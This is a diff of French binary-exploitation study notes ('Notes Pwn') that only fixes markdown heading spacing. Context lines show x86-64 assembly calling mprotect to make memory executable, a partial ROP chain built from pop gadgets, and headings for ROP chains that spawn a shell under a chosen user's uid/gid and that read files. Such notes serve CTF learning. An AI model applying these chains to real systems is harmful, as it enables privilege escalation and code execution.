@@ -1,6 +1,6 @@
-#Notes Pwn
+# Notes Pwn
 
-##Utilisation de  *mprotect()*
+## Utilisation de  *mprotect()*
 `$int mprotect(void *addr, size_t len, int prot);`
 
 
@@ -12,7 +12,7 @@
  * **PROT_WRITE** : Permet l'écriture.
  * **PROT_NONE** : Interdit l'accès à la mémoire.
 
-###En assembleur:
+### En assembleur:
 
 ```
 mov rax, 0xa            ; numéro du syscall pour mprotect sur x86-64
@@ -21,7 +21,7 @@ mov rsi, <taille>        ; taille de la région (doit être un multiple de la ta
 mov rdx, 0x7            ; protections: PROT_READ | PROT_WRITE | PROT_EXEC
 syscall                 ; appel du syscall
 ```
-###avec des : pop *registre* ; ret
+### avec des : pop *registre* ; ret
 Les adresses des pop sont trouvées avec ROPGadget
 ```
 ROPCHAIN = p64(pop_rdi) + p64(0x00000000006bc000) #adresse du début de la zone mémoire
@@ -31,7 +31,7 @@ ROPCHAIN = p64(pop_rdi) + p64(0x00000000006bc000) #adresse du début de la zone 
 					+ p64(syscall_ret)
 ```
 
-##ROPchain d'un execve() avec le uid et gid d'un utilisateur
+## ROPchain d'un execve() avec le uid et gid d'un utilisateur
 Le but est de lancer un shell avec les droits particulier d'un l'utilisateur.
 
 
@@ -60,7 +60,7 @@ Le but est de lancer un shell avec les droits particulier d'un l'utilisateur.
 )
 ```
 
-##Lire un fichier (chemin absolu)
+## Lire un fichier (chemin absolu)
 
 ```
 ROPChain = (
